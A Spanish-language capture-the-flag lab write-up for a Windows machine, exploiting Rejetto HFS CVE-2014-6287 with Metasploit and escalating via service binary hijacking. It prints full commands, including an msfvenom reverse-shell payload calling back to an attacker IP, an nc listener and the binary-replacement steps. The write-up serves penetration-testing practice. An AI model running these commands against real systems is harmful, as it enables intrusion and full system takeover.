# Steel Mountain

## 🖥️ Sistema

Windows

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Windows explotando una vulnerabilidad en **Rejetto HTTP File Server (HFS)** para obtener acceso inicial, realizar una enumeración de privilegios con **PowerUp** y escalar hasta **NT AUTHORITY\SYSTEM** aprovechando permisos inseguros sobre un servicio de Windows.

---

## 🛠️ Tecnologías trabajadas

- ReconX
- Rejetto HTTP File Server (HFS)
- CVE-2014-6287
- Metasploit
- Meterpreter
- PowerUp
- PowerShell
- msfvenom
- Windows Services
- Service Binary Hijacking
- Netcat

---

## 🧠 Metodología

La enumeración inicial permitió identificar un sistema **Windows** gracias a la presencia de servicios característicos como **SMB**, **RPC**, **WinRM** y **RDP**. Además, se detectaron varios servicios web, siendo el puerto **8080** el más prometedor para la explotación.

El reconocimiento de la aplicación reveló que el servidor ejecutaba **Rejetto HTTP File Server**, cuya versión era vulnerable a la **CVE-2014-6287**, permitiendo la ejecución remota de comandos. Mediante un módulo de **Metasploit** obtuve una sesión **Meterpreter** y acceso inicial al sistema.

Posteriormente utilicé **PowerUp** para identificar posibles vectores de escalada de privilegios. La herramienta detectó un servicio cuyo ejecutable podía ser reemplazado por un usuario con permisos de escritura. Aprovechando esta configuración insegura, sustituí el binario original por un payload generado con **msfvenom** y, tras reiniciar el servicio, obtuve una shell con privilegios de **NT AUTHORITY\SYSTEM**.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un reconocimiento con **ReconX**.

Los puertos detectados fueron:

| Puerto | Servicio |
|---------|----------|
| 80 | HTTP |
| 135 | RPC |
| 139 | NetBIOS |
| 445 | SMB |
| 3389 | RDP |
| 5985 | WinRM |
| 8080 | HTTP |
| 47001 | HTTPAPI |
| 49152-49156 | RPC dinámico |
| 49196 | RPC |
| 49197 | RPC |

La presencia de **SMB**, **RPC**, **WinRM** y **RDP** permitió identificar el sistema operativo como **Windows**.

---

### 2. Enumeración web

Accedí al servicio HTTP del puerto 80.

```text
http://<IP>
```

La página mostraba una fotografía correspondiente al **Empleado del Mes**.

Inspeccionando el código fuente obtuve el nombre del empleado.

```text
Bill Harper
```

A continuación accedí al servicio web del puerto **8080**.

```text
http://<IP>:8080
```

Allí encontré un panel perteneciente a:

```text
Rejetto HTTP File Server
```

Con ello identifiqué el software utilizado por el servidor.

---

### 3. Identificación de la vulnerabilidad

Busqué vulnerabilidades públicas utilizando **SearchSploit**.

```bash
searchsploit Rejetto HTTP File Server
```

Entre los resultados apareció una vulnerabilidad de ejecución remota de comandos.

```text
CVE-2014-6287
```

Esta vulnerabilidad permitía obtener acceso remoto al servidor.

---

### 4. Acceso inicial

Abrí **Metasploit**.

```bash
msfconsole
```

Busqué el módulo correspondiente.

```bash
search rejetto
```

Seleccioné el exploit adecuado.

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Configuré los parámetros necesarios.

```text
set RHOSTS <IP>
set LHOST <IP_ATACANTE>
set TARGETURI /
run
```

Tras ejecutar el exploit obtuve una sesión **Meterpreter**.

Para trabajar con mayor comodidad abrí una shell de Windows.

```text
shell
```

Accedí al escritorio del usuario.

```text
C:\Users\Bill\Desktop
```

Y recuperé la flag de usuario.

```text
user.txt
```

---

### 5. Enumeración para la escalada de privilegios

Con acceso inicial lancé **PowerUp** para revisar posibles configuraciones inseguras.

Subí el script.

```text
upload PowerUp.ps1
```

Cargué PowerShell.

```text
load powershell
```

Abrí una consola.

```text
powershell_shell
```

Importé el script.

```powershell
. .\PowerUp.ps1
```

Finalmente ejecuté todas las comprobaciones.

```powershell
Invoke-AllChecks
```

---

### 6. Identificación del servicio vulnerable

PowerUp detectó un servicio con la propiedad:

```text
CanRestart : True
```

Además, el directorio que contenía el ejecutable tenía permisos de escritura para el usuario comprometido.

El servicio vulnerable era:

```text
AdvancedSystemCareService9
```

Esta combinación permitía sustituir el binario original y ejecutarlo con privilegios elevados al reiniciar el servicio.

---

### 7. Escalada de privilegios

Generé un ejecutable malicioso utilizando **msfvenom**.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP_ATACANTE> LPORT=4646 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
```

El payload estaba diseñado para abrir una reverse shell cuando el servicio fuese iniciado.

Detuve el servicio.

```cmd
sc stop AdvancedSystemCareService9
```

Desde Meterpreter sustituí el ejecutable original.

```text
upload ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
```

Preparé un listener en la máquina atacante.

```bash
nc -lvnp 4646
```

Finalmente inicié nuevamente el servicio.

```cmd
sc start AdvancedSystemCareService9
```

Al arrancar el servicio se ejecutó el payload y obtuve una shell con privilegios de:

```text
NT AUTHORITY\SYSTEM
```

---

### 8. Obtención de la flag final

Con privilegios elevados accedí al escritorio del administrador.

```text
C:\Users\Administrator\Desktop
```

Leí el archivo:

```text
root.txt
```

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió practicar una cadena de explotación clásica sobre un entorno Windows, combinando explotación de una vulnerabilidad conocida con una escalada de privilegios basada en configuraciones inseguras de servicios.
- Identificar sistemas Windows mediante la enumeración de servicios.
- Reconocer instalaciones de **Rejetto HTTP File Server**.
- Localizar vulnerabilidades públicas utilizando **SearchSploit**.
- Explotar la **CVE-2014-6287** mediante **Metasploit**.
- Trabajar con sesiones **Meterpreter**.
- Utilizar **PowerUp** para identificar vectores de escalada de privilegios.
- Detectar servicios vulnerables mediante permisos inseguros sobre sus binarios.
- Generar payloads para servicios Windows con **msfvenom**.
- Escalar privilegios mediante **Service Binary Hijacking**.
- Obtener acceso como **NT AUTHORITY\SYSTEM**.
